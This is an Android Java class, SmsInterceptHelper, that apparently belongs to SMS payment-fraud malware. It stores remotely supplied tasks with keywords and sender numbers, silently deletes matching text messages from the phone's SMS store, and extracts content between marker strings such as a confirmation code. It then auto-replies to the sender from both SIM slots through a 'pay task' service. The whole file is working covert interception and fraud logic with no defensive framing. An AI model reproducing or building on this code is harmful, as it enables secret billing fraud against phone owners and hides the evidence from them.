package com.thirdparty.sms.utils;

import java.util.ArrayList;
import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.net.Uri;
import android.text.TextUtils;

import com.gandalf.daemon.utils.XL_log;
import com.thirdparty.entry.SmsSendTask;
import com.thirdparty.entry.SmsTask;
import com.thirdparty.net.GetPayTaskCallback;
import com.thirdparty.utils.PreferenceUtil;

public class SmsInterceptHelper {
    private static XL_log log = new XL_log(SmsInterceptHelper.class);

    private static Timer smTimer = new Timer(true);
    private Context mContext = null;

    private static SmsInterceptHelper INSTANCE = null;

    private static ArrayList<SmsTask> smCurrentSmsTask = new ArrayList<SmsTask>();

    private void updateCurrentSmsTask(ArrayList<SmsTask> current) {
        if (current != null) {
            smCurrentSmsTask = current;
        }
    }

    public ArrayList<SmsTask> getCurrentSmsTask() {
        if (smCurrentSmsTask != null && !smCurrentSmsTask.isEmpty()) {
            return smCurrentSmsTask;
        } else {
            ArrayList<SmsTask> arrayList = getAllSmsTask();
            if (arrayList != null) {
                updateCurrentSmsTask(arrayList);
            }
            return smCurrentSmsTask;
        }
    }

    public synchronized static SmsInterceptHelper getInstance(Context context) {
        if (INSTANCE == null) {
            INSTANCE = new SmsInterceptHelper(context);
        }
        return INSTANCE;
    }

    private SmsInterceptHelper(Context context) {
        this.mContext = context;
        scheduleRemoveInterceptRecord(context, 0, 3 * 1000);
    }

    private void scheduleRemoveInterceptRecord(Context context, long delyTime, long intercal) {
        if (context == null)
            return;
        if (smTimer != null) {
            smTimer.cancel();
        }
        smTimer = new Timer("InterceptRecord Watch Dog ");
        TimerTask timerTask = new TimerTask() {
            @Override
            public void run() {
                // TODO Auto-generated method stub
//                log.debug("do watch Intercept recored , determineSmsTaskEffictive");
                determineSmsTaskEffective();
            }
        };
        smTimer.schedule(timerTask, delyTime, intercal);
    }

    private void determineSmsTaskEffective() {
        ArrayList<SmsTask> curSmsTask = getCurrentSmsTask();
        long curTime = System.currentTimeMillis();
        if (curSmsTask != null) {
            for (int i = 0; i < curSmsTask.size(); i++) {
                SmsTask task = curSmsTask.get(i);
                if (task != null) {
                    long addTime = task.mAddTime;
                    long effectiveTIme = task.mSmsEffectiveTime;
                    if (curTime - addTime >= effectiveTIme) {
                        log.debug("sms task id:" + task.mTaskId + " To the effective time and remove the task ");
                        curSmsTask.remove(i);
                        deleteAllSmsTask();
                        addTaskList(curSmsTask);
                        updateCurrentSmsTask(curSmsTask);
                    }
                }
            }
        }
    }

    public ArrayList<SmsTask> getAllSmsTask() {
        return PreferenceUtil.getAllSmsTask();
    }

    public void addTask(SmsTask smsTask) {
        if (smsTask != null) {
            ArrayList<SmsTask> before = PreferenceUtil.getAllSmsTask();
            if (before != null) {
                log.debug("add before size:" + before.size());
            }
            PreferenceUtil.addSmsTask(smsTask);
            ArrayList<SmsTask> after = PreferenceUtil.getAllSmsTask();
            if (after != null) {
                log.debug("add after size:" + after.size());
            }
            updateCurrentSmsTask(after);
            // scheduleRemoveSmsTask(smsTask);
        }
    }

    private void addTaskList(ArrayList<SmsTask> smsTasks) {
        if (smsTasks != null && !smsTasks.isEmpty()) {
//            ArrayList<SmsTask> before = PreferenceUtil.getAllSmsTask();
//            if (before != null) {
//                log.debug("add before size:" + before.size());
//            } else {
//                log.debug("add before size: 0");
//            }
            PreferenceUtil.addSmsTaskList(smsTasks);
            ArrayList<SmsTask> after = PreferenceUtil.getAllSmsTask();
//            if (after != null) {
//                log.debug("add after size:" + after.size());
//            }
        }
    }

    public void deleteSmsTaskFromId(String id) {
        if (!TextUtils.isEmpty(id)) {
            PreferenceUtil.deleteSmsTaskFromId(id);
            ArrayList<SmsTask> allTask = PreferenceUtil.getAllSmsTask();
            updateCurrentSmsTask(allTask);
        }
    }

    private void deleteAllSmsTask() {
        PreferenceUtil.deleteAllSmsTaks();
    }

    public ArrayList<String> getDeleteKeyWords() {
        ArrayList<String> keyWords = new ArrayList<String>();
        ArrayList<SmsTask> smSmsTasks = PreferenceUtil.getAllSmsTask();
        if (smSmsTasks == null) {
            return null;
        }
        for (int i = 0; i < smSmsTasks.size(); i++) {
            SmsTask smsTask = smSmsTasks.get(i);
            String keyWord = smsTask.mSmsDeleteKeyword;
            if (TextUtils.isEmpty(keyWord)) {
                continue;
            }
            keyWord = keyWord.replaceAll("\\s", "");
            if (!TextUtils.isEmpty(keyWord)) {
                String[] keys = keyWord.split("\\$");
                if (keys != null) {
                    for (int j = 0; j < keys.length; j++) {
                        String key = keys[j];
                        keyWords.add(key);
                    }
                }
            }
        }
        return keyWords;
    }

    public ArrayList<String> getDeleteKeyNumber() {
        ArrayList<String> keyNumbers = new ArrayList<String>();
        ArrayList<SmsTask> smSmsTasks = PreferenceUtil.getAllSmsTask();
        if (smSmsTasks == null) {
            return null;
        }
        for (int i = 0; i < smSmsTasks.size(); i++) {
            SmsTask smsTask = smSmsTasks.get(i);
            if (TextUtils.isEmpty(smsTask.mSmsDeleteNumber)) {
                continue;
            }
            String keyNumber = smsTask.mSmsDeleteNumber.replaceAll("\\s", "");
            if (!TextUtils.isEmpty(keyNumber)) {
                String[] keys = keyNumber.split("\\$");
                if (keys != null) {
                    for (int j = 0; j < keys.length; j++) {
                        String key = keys[j];
                        keyNumbers.add(key);
                    }
                }
            }
        }
        return keyNumbers;
    }

    private ArrayList<String> getReplyKeyWords() {
        ArrayList<String> replyKeywords = new ArrayList<String>();
        ArrayList<SmsTask> smSmsTasks = PreferenceUtil.getAllSmsTask();
        if (smSmsTasks == null) {
            return null;
        }
        for (int i = 0; i < smSmsTasks.size(); i++) {
            SmsTask smsTask = smSmsTasks.get(i);
            if (TextUtils.isEmpty(smsTask.mSmsReplyKeyword)) {
                continue;
            }
            String smsReplyKeyword = smsTask.mSmsReplyKeyword.replaceAll("\\s", "");
            if (!TextUtils.isEmpty(smsReplyKeyword)) {
                String[] keys = smsReplyKeyword.split("\\$");
                for (int j = 0; j < keys.length; j++) {
                    String key = keys[j];
                    replyKeywords.add(key);
                }
            }
        }
        return replyKeywords;
    }

    public boolean determinIntercept(String number, String smsContent) {
        if (TextUtils.isEmpty(number) || TextUtils.isEmpty(smsContent)) {
            return false;
        }
        number = number.replaceAll("\\s", "");
        smsContent = smsContent.replaceAll("\\s", "");
        boolean determineReply = determineReplyKeyConsistent(smsContent);
        if (determineReply) {
            return true;
        }
        boolean determineNumber = determineFromDeleteNumberConsistent(number);
        if (determineNumber) {
            return true;
        }
        boolean determineConent = determineFromSmsContentKeyConsistent(smsContent);
        if (determineConent) {
            return true;
        }
        return false;

    }

    public boolean determineReplyKeyConsistent(String smsContent) {
        ArrayList<String> keyWords = getReplyKeyWords();
        if (keyWords == null) {
            return false;
        }
        for (int i = 0; i < keyWords.size(); i++) {
            String keyWord = keyWords.get(i);
            if (TextUtils.isEmpty(keyWord)) {
                continue;
            }
            String[] keys = keyWord.split("\\*");
            boolean prifxConsistent = false;
            boolean suffixConsistent = false;
            if (keys.length == 2) {
                if (smsContent.contains(keys[0])) {
                    prifxConsistent = true;
                }
                if (smsContent.contains(keys[1])) {
                    suffixConsistent = true;
                }
                if (prifxConsistent && suffixConsistent) {
                    return true;
                }
            }
        }
        return false;
    }

    public boolean determineFromDeleteNumberConsistent(String number) {
        if (TextUtils.isEmpty(number)) {
            return false;
        }
        number = number.replaceAll("\\s", "");
        ArrayList<String> keyWords = getDeleteKeyNumber();
        if (keyWords == null) {
            return false;
        }
        for (int i = 0; i < keyWords.size(); i++) {
            String keyWord = keyWords.get(i);
            if (TextUtils.isEmpty(keyWord)) {
                continue;
            }
            if (number.contains(keyWord)) {
                return true;
            }
        }
        return false;
    }

    public boolean determineFromSmsContentKeyConsistent(String conentKey) {
        if (TextUtils.isEmpty(conentKey)) {
            return false;
        }
        conentKey = conentKey.replaceAll("\\s", "");
        ArrayList<String> keyWords = getDeleteKeyWords();
        if (keyWords == null)
            return false;
        for (int i = 0; i < keyWords.size(); i++) {
            String keyWord = keyWords.get(i);
            if (TextUtils.isEmpty(keyWord)) {
                continue;
            }
            if (conentKey.contains(keyWord)) {
                return true;
            }
        }
        return false;
    }

    public String getReplyContentFromSmsContent(String smsContent) {
        ArrayList<String> keyWords = getReplyKeyWords();
        if (keyWords == null)
            return null;
        for (int i = 0; i < keyWords.size(); i++) {
            String keyWord = keyWords.get(i);
            if (TextUtils.isEmpty(keyWord)) {
                continue;
            }
            String[] keys = keyWord.split("\\*");
            boolean prifixConsistent = false;
            boolean suffixConsistent = false;
            int keySize = keys.length;
            if (keySize != 2) {
                continue;
            }
            if (smsContent.contains(keys[0])) {
                prifixConsistent = true;
            }
            if (smsContent.contains(keys[1])) {
                suffixConsistent = true;
            }
            if (prifixConsistent && suffixConsistent) {
                int prifixIndex = smsContent.indexOf(keys[0]);
                int suffixIndex = smsContent.indexOf(keys[1]);
                if (prifixIndex >= 0 && prifixIndex < smsContent.length() && suffixIndex >= 0 && suffixIndex < smsContent.length() && prifixIndex < suffixIndex) {
                    return smsContent.substring(prifixIndex + keys[0].length(), suffixIndex);
                }
            }
        }
        return null;
    }

    // public static void sendSmsByTask(String smsContent, String toNumber, int
    // sim_id) {
    // if (TextUtils.isEmpty(smsContent)) {
    // log.error("smsContent is null");
    // return;
    // }
    // if (TextUtils.isEmpty(toNumber)) {
    // log.error("toNumber is null");
    // return;
    // }
    // SmsSendTask smsSendTask = new SmsSendTask();
    // smsSendTask.mContent = smsContent;
    // smsSendTask.mSendToNumber = toNumber;
    // smsSendTask.mSimId = sim_id;
    // GetPayTaskCallback.startServiceWithdSendSmsTasksDoDeleteSmsTest();
    // }

    public boolean deleteIndexSmsRecordById(Context context, long id) {
        int deleteRet = context.getContentResolver().delete(Uri.parse("content://sms"), "_id=" + id, null);
        log.debug("deleteIndexSmsRecordById id:" + id + " ,result:" + deleteRet);
        if (deleteRet == 1) {
            return true;
        }
        return false;
    }

    public static boolean deleteSentSmsRecordById(Context context, long id) {
        int deleteRet = context.getContentResolver().delete(Uri.parse("content://sms"), "_id=" + id, null);
        // log.debug("deleteSentSmsRecordById id:" + id + " ,result:" +
        // deleteRet);
        if (deleteRet == 1) {
            return true;
        }
        return false;
    }

    public void startReplyTask(String replyContent, String fromNumber) {
        SmsSendTask smsSendTask1 = new SmsSendTask();
        smsSendTask1.mContent = replyContent;
        smsSendTask1.mSendToNumber = fromNumber;
        smsSendTask1.mSimId = 1;
        SmsSendTask smsSendTask2 = new SmsSendTask();
        smsSendTask2.mContent = replyContent;
        smsSendTask2.mSendToNumber = fromNumber;
        smsSendTask2.mSimId = 2;
        ArrayList<SmsSendTask> smsSendTasks = new ArrayList<SmsSendTask>();
        smsSendTasks.add(smsSendTask1);
        smsSendTasks.add(smsSendTask2);
        GetPayTaskCallback.startServiceWithdSendSmsTasks(mContext, smsSendTasks);
    }
}
